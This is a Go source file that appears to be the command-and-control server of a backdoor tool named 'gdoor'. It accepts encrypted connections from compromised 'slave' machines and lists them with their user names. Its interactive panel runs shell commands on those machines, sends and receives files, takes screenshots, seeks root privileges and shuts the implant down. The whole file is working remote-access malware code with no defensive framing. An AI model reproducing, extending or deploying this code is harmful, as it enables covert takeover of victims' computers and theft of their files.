package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strings"

	"gdoor/config"
	"gdoor/crypto"
	"gdoor/service"
	"gdoor/socket"

	"github.com/fatih/color"
)

var socks = make(map[string]socket.Socket)
var socksUser = make(map[string]string)

func connHandler(token string, sock socket.Socket) {
	reader := bufio.NewReader(os.Stdin)

	for true {
		fmt.Printf("%s%s%s%s",
			color.HiYellowString(token),
			color.HiWhiteString("@"),
			color.HiMagentaString(strings.Split(sock.RemoteAddr().String(), ":")[0]),
			color.HiWhiteString("$ "))

		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		switch strings.Split(input, " ")[0] {
		case "help":
			fmt.Printf("\t%s\t\t%s\n", color.HiBlueString("help"), "Show this help message.")
			fmt.Printf("\t%s\t%s\n", color.HiBlueString("shell $cmd"), "Execute shell command.")
			fmt.Printf("\t%s\t%s\n", color.HiBlueString("cd $path"), "Chdir to $path.")
			fmt.Printf("\t%s\t%s\n", color.HiBlueString("push $file"), "Send file to slave.")
			fmt.Printf("\t%s\t%s\n", color.HiBlueString("pull $file"), "Receive file from slave.")
			fmt.Printf("\t%s\t%s\n", color.HiBlueString("screenshot"), "Take a screenshot.")
			fmt.Printf("\t%s\t\t%s\n", color.HiBlueString("root"), "get root privileges.")
			fmt.Printf("\t%s\t%s\n", color.HiBlueString("shutdown"), "Kill the slave.")
			fmt.Printf("\t%s\t\t%s\n", color.HiBlueString("quit"), "Detach this slave.")
			continue

		case "quit":
			return

		case "":
			continue

		case "push":
			sock.Write([]byte(input))
			cmds := strings.Split(input, "push")
			cmds[1] = strings.TrimSpace(cmds[1])

			ftokenB, _ := sock.Read()
			ftoken := string(ftokenB)
			socks[ftoken].SendFile(cmds[1])
			socks[ftoken].Close()
			delete(socks, ftoken)

		case "pull":
			sock.Write([]byte(input))
			cmds := strings.Split(input, "pull")
			cmds[1] = strings.TrimSpace(cmds[1])

			ftokenB, _ := sock.Read()
			ftoken := string(ftokenB)
			socks[ftoken].RecvFile(cmds[1])
			socks[ftoken].Close()
			delete(socks, ftoken)

		default:
			sock.Write([]byte(input))
		}

		resp, err := sock.Read()
		if err == io.EOF {
			sock.Close()
			delete(socks, token)
			return
		}

		fmt.Println(strings.TrimRight(string(resp), "\n"))
	}

	return
}

func main() {
	color.Yellow("           _                  ")
	color.Yellow("  __ _  __| | ___   ___  _ __ ")
	color.Yellow(" / _` |/ _` |/ _ \\ / _ \\| '__|")
	color.Yellow("| (_| | (_| | (_) | (_) | |")
	color.Yellow(" \\__, |\\__,_|\\___/ \\___/|_|   ")
	color.Yellow(" |___/                        ")
	color.Yellow("")

	// start file server
	service.Service()

	// start main server
	server, err := net.Listen("tcp", config.ServerPort)
	if err != nil {
		color.HiRed("Fail to start server, %s", err)
		return
	}

	// listen
	go func() {
		for {
			conn, err := server.Accept()
			if err != nil {
				color.HiRed("Fail to connect, %s", err)
				break
			}

			if conn != nil {
				// build socket
				sock, err := socket.Init(conn, config.Key, false)
				if err != nil {
					continue
				}

				// get client information
				id, _ := sock.Read()
				ids := strings.Split(string(id), ":") // TOKEN:USER
				if len(ids) != 2 {
					continue
				}
				token, user := ids[0], ids[1]

				// generate socket and token
				for {
					if _, exist := socks[token]; !exist && token != "" {
						socks[token] = sock
						socksUser[token] = user
						sock.Write([]byte(token))
						break
					}
					token = crypto.RandStringBytesMaskImprSrc(8)
				}
			}
		}
	}()

	// control panel
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Printf("%s%s ", color.HiGreenString("gdoor"), color.HiWhiteString(">"))

		var command, reqToken string

		command, _ = reader.ReadString('\n')
		command = strings.TrimSpace(command)
		switch strings.Split(command, " ")[0] {
		case "help":
			fmt.Printf("\t%s\t\t%s\n", color.HiBlueString("help"), "Show this help message.")
			fmt.Printf("\t%s\t\t%s\n", color.HiBlueString("ls"), "List all slaves.")
			fmt.Printf("\t%s\t%s\n", color.HiBlueString("c $token"), "Connect to specified slave.")
			fmt.Printf("\t%s\t\t%s\n", color.HiBlueString("exit"), "Exit.")

		case "ls":
			for k, v := range socks {
				v.Write([]byte("ping"))
				resp, err := v.Read()
				if err == io.EOF || string(resp) != "pong" {
					v.Close()
					delete(socks, k)
					continue
				}

				fmt.Printf("%s %v [%s]\n", color.CyanString(k), v.RemoteAddr(), color.YellowString(socksUser[k]))
			}

		case "c":
			commands := strings.Split(command, " ")
			if len(commands) < 2 {
				color.HiRed("Too few arguments.")
			} else {
				reqToken = commands[1]
				if sock, exist := socks[reqToken]; exist {
					connHandler(reqToken, sock)
				} else {
					color.HiRed("No such token.")
				}
			}

		case "exit":
			for _, v := range socks {
				v.Close()
			}
			return

		default:
			color.HiRed("No such comand.")
		}
	}
}
